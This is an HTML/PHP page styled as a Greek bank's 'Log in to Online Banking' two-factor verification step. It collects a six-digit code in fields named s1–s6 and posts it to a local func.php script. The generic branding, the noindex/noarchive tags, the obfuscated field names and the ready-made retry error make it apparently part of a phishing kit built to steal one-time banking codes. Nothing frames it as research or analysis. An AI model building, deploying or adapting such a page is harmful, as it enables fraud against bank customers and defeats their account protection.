<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body>

        <div id="wrapper">
            <div class="left"></div>
            <div class="right">
                <div class="inner">
                    <div class="logo">
                        <div><img style="max-width: 230px;" src="./Assets/imgs/logo.svg"></div>
                        <div class="lang">
                            <button type="button">Ελληνικά <i class="fa-solid fa-caret-down"></i></button>
                            <ul>
                                <li><a href="index.php?lang=gr">Ελληνικά</a></li>
                                <li><a href="index.php?lang=en">English</a></li>
                            </ul>
                        </div>
                    </div>
                    <form action="./Assets/php/config/func.php" method="POST">
                        <input type="hidden" name="f2">
                        <div class="title">
                            <h3>Έλεγχος ταυτότητας δύο παραγόντων (2FA)</h3>
                            <p>Στείλαμε έναν κωδικό επαλήθευσης στη συνδεδεμένη συσκευή σας για να ενισχύσουμε την ασφάλεια του λογαριασμού σας.</p>
                        </div>
                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <div class="sym"><i class="fa-solid fa-circle-exclamation"></i></div>
                            <p>Οι πληροφορίες που έχετε εισάγει είναι εσφαλμένες. Ελέγξτε τις πληροφορίες και δοκιμάστε ξανά</p>
                        </div>
                        <?php endif; ?>
                        <div class="form-group mb20 <?php if(isset($_GET['error'])) echo "has-error"?>">
                            <label for="zz">Κωδικός ασφαλείας (2FA)</label>
                            <div class="inputs zz">
                                <input inputmode="numeric" type="text" name="s1" id="s1" class="form-control" placeholder="0">
                                <input inputmode="numeric" type="text" name="s2" id="s2" class="form-control" placeholder="0">
                                <input inputmode="numeric" type="text" name="s3" id="s3" class="form-control" placeholder="0">
                                <input inputmode="numeric" type="text" name="s4" id="s4" class="form-control" placeholder="0">
                                <input inputmode="numeric" type="text" name="s5" id="s5" class="form-control" placeholder="0">
                                <input inputmode="numeric" type="text" name="s6" id="s6" class="form-control" placeholder="0">
                            </div>
                        </div>
                        <div class="btns mb30">
                            <button type="submit">Συνεχίζω</button>
                        </div>
                        <p style="font-size: 16px;"><span><i class="fa-solid fa-arrow-left-long"></i> Επιστροφή στην είσοδο</span></p>
                    </form>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

            $('#s1').mask('0');
            $('#s2').mask('0');
            $('#s3').mask('0');
            $('#s4').mask('0');
            $('#s5').mask('0');
            $('#s6').mask('0');

            $('.inputs.zz input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });
        </script>

    </body>

</html>